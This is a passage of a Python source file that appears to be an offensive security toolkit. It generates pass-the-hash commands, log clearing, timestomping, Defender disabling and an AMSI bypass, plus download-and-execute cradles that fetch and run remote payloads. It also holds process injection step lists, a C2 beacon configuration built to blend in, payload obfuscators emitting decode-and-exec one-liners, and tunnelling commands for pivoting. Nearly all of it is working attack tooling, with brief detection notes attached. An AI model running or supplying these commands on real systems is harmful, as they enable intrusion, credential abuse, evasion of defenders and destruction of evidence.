        }

    if technique in ('all', 'pass_the_hash'):
        movements['pass_the_hash'] = {
            'name': 'Pass-the-Hash',
            'risk_level': 'critical',
            'noise_level': 'medium',
            'description': 'Authenticate using NTLM hash without knowing the password',
            'mitre': 'T1550.002',
            'commands': {
                'impacket_pth': f'impacket-psexec -hashes :{password} {domain}/{username}@{target_host}',
                'crackmapexec': f'crackmapexec smb {target_host} -u {username} -H {password} -d {domain}',
                'mimikatz': f'sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{password} /run:cmd.exe',
                'evil_winrm': f'evil-winrm -i {target_host} -u {username} -H {password}',
            },
            'detection': 'Event ID 4624 (Type 3 logon with NTLM), unusual admin activity',
        }

    return {
        'techniques': movements,
        'total': len(movements),
        'target': target_host,
        'generated_at': datetime.now().isoformat(),
    }


# ==========================================
#  6. ANTI-FORENSICS TOOLKIT
# ==========================================

def generate_anti_forensics(action='all', target_os='windows'):
    """Generate anti-forensics commands and techniques"""
    techniques = {}

    if target_os == 'windows':
        if action in ('all', 'log_clearing'):
            techniques['clear_event_logs'] = {
                'name': 'Clear Windows Event Logs',
                'risk_level': 'critical',
                'description': 'Clear all Windows event logs to remove evidence',
                'commands': [
                    'wevtutil cl System',
                    'wevtutil cl Security',
                    'wevtutil cl Application',
                    'wevtutil cl "Windows PowerShell"',
                    'wevtutil cl "Microsoft-Windows-Sysmon/Operational"',
                    'for /F "tokens=*" %1 in (\'wevtutil.exe el\') DO wevtutil.exe cl "%1"',
                ],
                'powershell': 'Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }',
                'detection': 'Event ID 1102 (audit log cleared), gap in log timeline',
            }

        if action in ('all', 'timestomp'):
            techniques['timestomping'] = {
                'name': 'File Timestomping',
                'risk_level': 'high',
                'description': 'Modify file timestamps to blend in with legitimate files',
                'commands': {
                    'powershell': '(Get-Item "C:\\target\\file.exe").CreationTime = "01/01/2023 08:00:00"; (Get-Item "C:\\target\\file.exe").LastWriteTime = "01/01/2023 08:00:00"; (Get-Item "C:\\target\\file.exe").LastAccessTime = "01/01/2023 08:00:00"',
                    'metasploit': 'timestomp C:\\target\\file.exe -m "01/01/2023 08:00:00"',
                },
                'detection': '$MFT vs $STANDARD_INFORMATION timestamp comparison',
            }

        if action in ('all', 'secure_delete'):
            techniques['secure_delete'] = {
                'name': 'Secure File Deletion',
                'risk_level': 'high',
                'description': 'Overwrite and delete files to prevent recovery',
                'commands': {
                    'cipher': 'cipher /w:C:\\path\\to\\clean',
                    'sdelete': 'sdelete -p 3 -s C:\\path\\to\\delete\\*',
                    'powershell': '$file = "C:\\target"; $bytes = [byte[]]::new((Get-Item $file).Length); (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes($file, $bytes); Remove-Item $file -Force',
                },
                'detection': 'File system journal analysis, data carving from unallocated space',
            }

        if action in ('all', 'disable_defender'):
            techniques['disable_defender'] = {
                'name': 'Disable Windows Defender',
                'risk_level': 'critical',
                'description': 'Disable real-time protection and monitoring',
                'commands': [
                    'Set-MpPreference -DisableRealtimeMonitoring $true',
                    'Set-MpPreference -DisableBehaviorMonitoring $true',
                    'Set-MpPreference -DisableScriptScanning $true',
                    'Set-MpPreference -DisableIOAVProtection $true',
                    'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force',
                ],
                'detection': 'Defender tamper protection alerts, Event ID 5001',
            }

        if action in ('all', 'amsi_bypass'):
            techniques['amsi_bypass'] = {
                'name': 'AMSI Bypass',
                'risk_level': 'high',
                'description': 'Bypass Antimalware Scan Interface to run undetected scripts',
                'techniques': [
                    {
                        'name': 'Reflection method',
                        'code': '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
                    },
                    {
                        'name': 'Memory patching',
                        'description': 'Patch AmsiScanBuffer in amsi.dll to return AMSI_RESULT_CLEAN',
                    },
                    {
                        'name': 'COM hijacking',
                        'description': 'Register a fake AMSI COM server that returns clean results',
                    },
                ],
                'detection': 'Script block logging, ETW monitoring',
            }

    else:  # Linux
        if action in ('all', 'log_clearing'):
            techniques['clear_logs'] = {
                'name': 'Clear Linux Logs',
                'risk_level': 'critical',
                'description': 'Clear system and authentication logs',
                'commands': [
                    'echo "" > /var/log/auth.log',
                    'echo "" > /var/log/syslog',
                    'echo "" > /var/log/messages',
                    'echo "" > /var/log/wtmp',
                    'echo "" > /var/log/btmp',
                    'echo "" > /var/log/lastlog',
                    'history -c && history -w',
                    'echo "" > ~/.bash_history',
                    'unset HISTFILE',
                ],
                'detection': 'Log monitoring, file integrity monitoring',
            }

        if action in ('all', 'timestomp'):
            techniques['timestomping'] = {
                'name': 'File Timestomping',
                'risk_level': 'high',
                'description': 'Modify file timestamps on Linux',
                'commands': {
                    'touch': 'touch -t 202301010800 /path/to/file',
                    'reference': 'touch -r /bin/ls /path/to/malicious/file',
                    'debugfs': 'debugfs -w -R "set_inode_field /path crtime 202301010800" /dev/sda1',
                },
                'detection': 'Compare ext4 crtime with mtime, audit logs',
            }

        if action in ('all', 'rootkit_hiding'):
            techniques['process_hiding'] = {
                'name': 'Process & File Hiding',
                'risk_level': 'critical',
                'description': 'Hide processes and files from system tools',
                'techniques': {
                    'mount_bind': 'mount --bind /empty_dir /proc/{PID}',
                    'ld_preload': 'Hook readdir() to filter process listing',
                    'kernel_module': 'LKM to hook sys_getdents to hide files/processes',
                    'proc_hide': 'mount -o bind /dev/null /proc/{PID}/cmdline',
                },
                'detection': 'Cross-reference /proc with kernel memory, integrity monitoring',
            }

    return {
        'techniques': techniques,
        'target_os': target_os,
        'total': len(techniques),
        'generated_at': datetime.now().isoformat(),
    }


# ==========================================
#  7. DOWNLOAD CRADLE GENERATOR
# ==========================================

def generate_download_cradles(payload_url='', output_path='', execution=True):
    """Generate download and execute cradles for various platforms"""
    cradles = {}

    cradles['powershell_iex'] = {
        'name': 'PowerShell IEX',
        'platform': 'windows',
        'stealth': 'low',
        'command': f"powershell -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{payload_url}')\"",
    }

    cradles['powershell_invoke'] = {
        'name': 'PowerShell Invoke-WebRequest',
        'platform': 'windows',
        'stealth': 'low',
        'command': f"powershell -nop -w hidden -c \"Invoke-WebRequest -Uri '{payload_url}' -OutFile '{output_path}'; Start-Process '{output_path}'\"",
    }

    cradles['certutil'] = {
        'name': 'Certutil Download',
        'platform': 'windows',
        'stealth': 'medium',
        'command': f"certutil -urlcache -split -f {payload_url} {output_path} && {output_path}",
    }

    cradles['bitsadmin'] = {
        'name': 'BITSAdmin',
        'platform': 'windows',
        'stealth': 'medium',
        'command': f"bitsadmin /transfer job /download /priority high {payload_url} {output_path} && {output_path}",
    }

    cradles['curl_bash'] = {
        'name': 'cURL + Bash',
        'platform': 'linux',
        'stealth': 'low',
        'command': f"curl -s {payload_url} | bash",
    }

    cradles['wget_exec'] = {
        'name': 'wget + Execute',
        'platform': 'linux',
        'stealth': 'low',
        'command': f"wget -qO- {payload_url} | bash",
    }

    cradles['python_exec'] = {
        'name': 'Python Download',
        'platform': 'cross-platform',
        'stealth': 'medium',
        'command': f"python3 -c \"import urllib.request,os;exec(urllib.request.urlopen('{payload_url}').read())\"",
    }

    cradles['mshta'] = {
        'name': 'MSHTA (HTA)',
        'platform': 'windows',
        'stealth': 'high',
        'command': f"mshta {payload_url}",
    }

    cradles['regsvr32'] = {
        'name': 'Regsvr32 (Squiblydoo)',
        'platform': 'windows',
        'stealth': 'high',
        'command': f"regsvr32 /s /n /u /i:{payload_url} scrobj.dll",
    }

    cradles['rundll32'] = {
        'name': 'Rundll32',
        'platform': 'windows',
        'stealth': 'high',
        'command': f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('{payload_url}')\")",
    }

    return {
        'cradles': cradles,
        'total': len(cradles),
        'payload_url': payload_url,
        'generated_at': datetime.now().isoformat(),
    }


# ==========================================
#  8. PROCESS INJECTION TECHNIQUES
# ==========================================

def get_injection_techniques():
    """Get process injection technique reference"""
    return {
        'techniques': {
            'classic_dll_injection': {
                'name': 'Classic DLL Injection',
                'mitre': 'T1055.001',
                'risk': 'medium',
                'description': 'Inject a DLL into a remote process using CreateRemoteThread + LoadLibrary',
                'steps': [
                    'OpenProcess with PROCESS_ALL_ACCESS',
                    'VirtualAllocEx to allocate memory in target',
                    'WriteProcessMemory to write DLL path',
                    'CreateRemoteThread with LoadLibraryA entry point',
                ],
                'detectable_by': ['API monitoring', 'DLL load events', 'Thread creation events'],
                'target_processes': ['explorer.exe', 'svchost.exe', 'RuntimeBroker.exe'],
            },
            'process_hollowing': {
                'name': 'Process Hollowing',
                'mitre': 'T1055.012',
                'risk': 'high',
                'description': 'Create a suspended process, hollow it out, and replace with malicious code',
                'steps': [
                    'CreateProcess with CREATE_SUSPENDED flag',
                    'NtUnmapViewOfSection to hollow the process',
                    'VirtualAllocEx + WriteProcessMemory to inject',
                    'SetThreadContext to point to new entry point',
                    'ResumeThread to execute',
                ],
                'detectable_by': ['Memory forensics', 'PE header analysis', 'Hollow process detection'],
                'target_processes': ['svchost.exe', 'dllhost.exe', 'regsvr32.exe'],
            },
            'apc_injection': {
                'name': 'APC Queue Injection',
                'mitre': 'T1055.004',
                'risk': 'high',
                'description': 'Queue an Asynchronous Procedure Call to execute code in target thread',
                'steps': [
                    'OpenProcess and allocate memory',
                    'Write shellcode to allocated memory',
                    'QueueUserAPC targeting alertable thread',
                    'Thread executes APC on next alertable wait',
                ],
                'detectable_by': ['APC queue monitoring', 'Memory scanning'],
            },
            'thread_hijacking': {
                'name': 'Thread Execution Hijacking',
                'mitre': 'T1055.003',
                'risk': 'critical',
                'description': 'Suspend a thread, modify its context to point to shellcode, then resume',
                'steps': [
                    'OpenThread with THREAD_ALL_ACCESS',
                    'SuspendThread to pause execution',
                    'VirtualAllocEx + WriteProcessMemory (shellcode)',
                    'GetThreadContext / SetThreadContext (modify RIP/EIP)',
                    'ResumeThread to execute shellcode',
                ],
                'detectable_by': ['Thread context changes', 'Suspended thread analysis'],
            },
            'ppid_spoofing': {
                'name': 'Parent PID Spoofing',
                'mitre': 'T1134.004',
                'risk': 'high',
                'description': 'Create a process with a spoofed parent to evade detection',
                'steps': [
                    'Initialize STARTUPINFOEX with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS',
                    'OpenProcess on desired parent (e.g., explorer.exe)',
                    'UpdateProcThreadAttribute with parent handle',
                    'CreateProcess with extended startup info',
                ],
                'detectable_by': ['ETW process creation events', 'Parent-child relationship analysis'],
            },
            'early_bird_injection': {
                'name': 'Early Bird APC Injection',
                'mitre': 'T1055.004',
                'risk': 'critical',
                'description': 'Inject APC before process initialization completes (before EDR hooks)',
                'steps': [
                    'CreateProcess with CREATE_SUSPENDED',
                    'VirtualAllocEx in the suspended process',
                    'WriteProcessMemory with shellcode',
                    'QueueUserAPC to the main thread',
                    'ResumeThread - APC runs before any DLLs load',
                ],
                'detectable_by': ['Kernel-level monitoring', 'Early APC detection'],
            },
            'ntcreatesection_map': {
                'name': 'Section Mapping Injection',
                'mitre': 'T1055',
                'risk': 'critical',
                'description': 'Use NtCreateSection + NtMapViewOfSection for stealthier injection',
                'steps': [
                    'NtCreateSection to create a shared memory section',
                    'NtMapViewOfSection into local process (write shellcode)',
                    'NtMapViewOfSection into target process',
                    'Create remote thread at mapped address',
                ],
                'detectable_by': ['Section object monitoring', 'Cross-process mapping alerts'],
            },
        },
        'generated_at': datetime.now().isoformat(),
    }


# ==========================================
#  9. C2 PROTOCOL BUILDER
# ==========================================

def build_c2_config(protocol='https', domain='', port=443, jitter=20, sleep=60, kill_date='', user_agent=''):
    """Build C2 communication configuration"""
    
    ua = user_agent or random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ])

    config = {
        'c2_profile': {
            'protocol': protocol,
            'domain': domain,
            'port': port,
            'user_agent': ua,
            'sleep_interval': sleep,
            'jitter_percent': jitter,
            'kill_date': kill_date or (datetime.now().replace(year=datetime.now().year + 1)).strftime('%Y-%m-%d'),
            'max_retries': 10,
            'retry_delay': 300,
        },
        'communication': {
            'check_in_uri': f'/{_random_path()}',
            'task_uri': f'/{_random_path()}',
            'result_uri': f'/{_random_path()}',
            'file_uri': f'/{_random_path()}',
            'headers': {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
            },
        },
        'encryption': {
            'algorithm': 'AES-256-CBC',
            'key_exchange': 'RSA-2048',
            'session_key': hashlib.sha256(os.urandom(32)).hexdigest(),
            'hmac': 'SHA256',
        },
        'dns_c2': {
            'enabled': protocol == 'dns',
            'domain': f'update.{domain}' if domain else 'update.example.com',
            'record_type': 'TXT',
            'max_data_per_query': 189,
            'encoding': 'base32',
        },
        'proxy_config': {
            'use_system_proxy': True,
            'fallback_proxies': [],
            'proxy_rotation': False,
        },
        'generated_at': datetime.now().isoformat(),
    }

    return config


def _random_path():
    """Generate random URL path that looks legitimate"""
    paths = [
        'api/v2/update', 'assets/img/logo', 'cdn/js/analytics',
        'static/css/main', 'wp-content/plugins/update',
        'wp-includes/js/jquery', 'api/v1/status', 'health/check',
        'images/icons/favicon', 'scripts/tracking', 'beacon/pixel',
        'feed/rss', 'sitemap', 'robots', '.well-known/security',
    ]
    return random.choice(paths) + '/' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


# ==========================================
#  10. PAYLOAD ENCODER/OBFUSCATOR
# ==========================================

def encode_payload(payload, technique='all'):
    """Encode/obfuscate a payload using various techniques"""
    results = {}

    if technique in ('all', 'base64'):
        results['base64'] = {
            'name': 'Base64 Encoding',
            'encoded': base64.b64encode(payload.encode()).decode(),
            'decoder_bash': f'echo "{base64.b64encode(payload.encode()).decode()}" | base64 -d | bash',
            'decoder_ps': f'powershell -enc {base64.b64encode(payload.encode("utf-16-le")).decode()}',
        }

    if technique in ('all', 'hex'):
        hex_encoded = payload.encode().hex()
        results['hex'] = {
            'name': 'Hex Encoding',
            'encoded': hex_encoded,
            'decoder_bash': f'echo {hex_encoded} | xxd -r -p | bash',
            'decoder_python': f'python3 -c "exec(bytes.fromhex(\'{hex_encoded}\').decode())"',
        }

    if technique in ('all', 'xor'):
        key = random.randint(1, 255)
        xor_bytes = bytes([b ^ key for b in payload.encode()])
        xor_b64 = base64.b64encode(xor_bytes).decode()
        results['xor'] = {
            'name': f'XOR (key=0x{key:02x})',
            'key': key,
            'encoded': xor_b64,
            'decoder_python': f'python3 -c "import base64;exec(bytes([b^{key} for b in base64.b64decode(\'{xor_b64}\')]))"',
        }

    if technique in ('all', 'reverse'):
        rev = payload[::-1]
        results['reverse'] = {
            'name': 'String Reversal',
            'encoded': rev,
            'decoder_bash': f'echo "{rev}" | rev | bash',
            'decoder_python': f'python3 -c "exec(\'{rev}\'[::-1])"',
        }

    if technique in ('all', 'rot13'):
        import codecs
        rot = codecs.encode(payload, 'rot_13')
        results['rot13'] = {
            'name': 'ROT13',
            'encoded': rot,
            'decoder_python': f'python3 -c "import codecs;exec(codecs.decode(\'{rot}\',\'rot_13\'))"',
        }

    if technique in ('all', 'decimal'):
        dec = ','.join(str(ord(c)) for c in payload)
        results['decimal'] = {
            'name': 'Decimal/Char Code',
            'encoded': dec,
            'decoder_python': f'python3 -c "exec(\'\'.join(chr(int(c)) for c in \'{dec}\'.split(\',\')))"',
        }

    return {
        'original_length': len(payload),
        'encodings': results,
        'total': len(results),
        'generated_at': datetime.now().isoformat(),
    }


# ==========================================
#  11. NETWORK TUNNEL BUILDER
# ==========================================

def build_tunnel_config(tunnel_type='all', local_port=8080, remote_host='', remote_port=80, proxy_port=1080):
    """Generate network tunnel and proxy configurations"""
    tunnels = {}

    if tunnel_type in ('all', 'ssh_forward'):
        tunnels['ssh_local_forward'] = {
            'name': 'SSH Local Port Forward',
            'description': f'Forward local port {local_port} to {remote_host}:{remote_port} through SSH',
            'command': f'ssh -L {local_port}:{remote_host}:{remote_port} -N user@jump_host',
            'usage': f'Access {remote_host}:{remote_port} via localhost:{local_port}',
        }
        tunnels['ssh_remote_forward'] = {
            'name': 'SSH Remote Port Forward',
            'description': f'Expose local port {local_port} on the remote server',
            'command': f'ssh -R {remote_port}:localhost:{local_port} -N user@remote_server',
        }
        tunnels['ssh_dynamic'] = {
            'name': 'SSH Dynamic SOCKS Proxy',
            'description': f'Create a SOCKS5 proxy on port {proxy_port}',
            'command': f'ssh -D {proxy_port} -N user@jump_host',
            'proxychains_conf': f'socks5 127.0.0.1 {proxy_port}',
        }

    if tunnel_type in ('all', 'chisel'):
        tunnels['chisel_server'] = {
            'name': 'Chisel Server',
            'command': f'chisel server --reverse --port {remote_port}',
        }
        tunnels['chisel_client_forward'] = {
            'name': 'Chisel Client (Forward)',
            'command': f'chisel client {remote_host}:{remote_port} {local_port}:{remote_host}:{remote_port}',
        }
        tunnels['chisel_client_socks'] = {
            'name': 'Chisel Client (SOCKS)',
            'command': f'chisel client {remote_host}:{remote_port} R:socks',
        }

    if tunnel_type in ('all', 'socat'):
        tunnels['socat_tcp'] = {
            'name': 'Socat TCP Relay',
            'command': f'socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port}',
        }
        tunnels['socat_ssl'] = {
            'name': 'Socat SSL Tunnel',
            'command': f'socat TCP-LISTEN:{local_port},fork OPENSSL:{remote_host}:{remote_port},verify=0',
        }

    if tunnel_type in ('all', 'netsh'):
        tunnels['netsh_portproxy'] = {
            'name': 'Netsh Port Proxy (Windows)',
            'command': f'netsh interface portproxy add v4tov4 listenport={local_port} listenaddress=0.0.0.0 connectport={remote_port} connectaddress={remote_host}',
            'cleanup': f'netsh interface portproxy delete v4tov4 listenport={local_port} listenaddress=0.0.0.0',
        }

    if tunnel_type in ('all', 'dns_tunnel'):
        tunnels['dns_tunnel'] = {
            'name': 'DNS Tunnel (iodine)',
            'server': f'iodined -f -c -P password 10.0.0.1 tunnel.{remote_host}',
            'client': f'iodine -f -P password tunnel.{remote_host}',
            'description': 'Tunnel TCP traffic over DNS queries',
        }

    if tunnel_type in ('all', 'icmp_tunnel'):
        tunnels['icmp_tunnel'] = {
            'name': 'ICMP Tunnel (ptunnel-ng)',
            'server': 'ptunnel-ng -r0.0.0.0',
            'client': f'ptunnel-ng -p {remote_host} -l {local_port} -r {remote_host} -R {remote_port}',
            'description': 'Tunnel traffic over ICMP echo packets',
        }

    return {
        'tunnels': tunnels,
        'total': len(tunnels),
        'generated_at': datetime.now().isoformat(),
    }
